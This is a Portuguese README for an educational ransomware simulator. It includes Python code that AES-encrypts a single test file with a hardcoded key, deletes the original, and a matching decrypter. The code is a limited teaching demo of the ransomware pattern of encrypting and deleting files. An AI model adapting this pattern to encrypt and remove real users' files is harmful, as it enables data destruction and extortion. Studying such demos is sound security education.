## 🔒 Simulador de Ransomware em Python:
Este projeto é uma simulação de ransomware desenvolvida em Python no Kali Linux. Ele criptografa e descriptografa arquivos usando o algoritmo AES (Advanced Encryption Standard) por meio da biblioteca pyaes.
⚠️ Atenção: Este projeto é apenas para fins educacionais e não deve ser utilizado para atividades maliciosas. O uso indevido pode resultar em consequências legais.

## 📌 Origem do Projeto:
Este projeto foi um fork de um repositório do GitHub. Ele foi estudado para fins educacionais sobre Cibersegurança.

## 📌 Como funciona:
O script encrypter.py criptografa um arquivo chamado teste.txt e cria um novo arquivo criptografado com a extensão .ransomwaretroll.
O script decrypter.py descriptografa o arquivo e restaura o seu conteúdo original.

## 🚀 Tecnologias Utilizadas
Python 3,
Kali Linux,
**Biblioteca **pyaes

## 📥 Instalação e Execução
🔹 1. Clonar o repositório:
 git clone https://github.com/cassiano-dio/cibersecurity-desafio-ransomware
 cd simulador-ransomware

🔹 2. Instalar dependências:
Caso não tenha a biblioteca pyaes, instale com:
pip install pyaes

🔹 3. Criar um arquivo para teste:
Antes de rodar o script, crie um arquivo de teste:
echo "Alo Brasil" > teste.txt

🔹 4. Executar o Encrypter:
python encrypter.py
isso removerá o arquivo teste.txt e criará teste.txt.ransomwaretroll.

🔹 5. Executar o Decrypter:
python decrypter.py
isso removerá o arquivo criptografado e restaurará teste.txt.

## 📝🔹 Códigos
Encrypter (encrypter.py)

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo original
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

Decrypter (decrypter.py)
import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
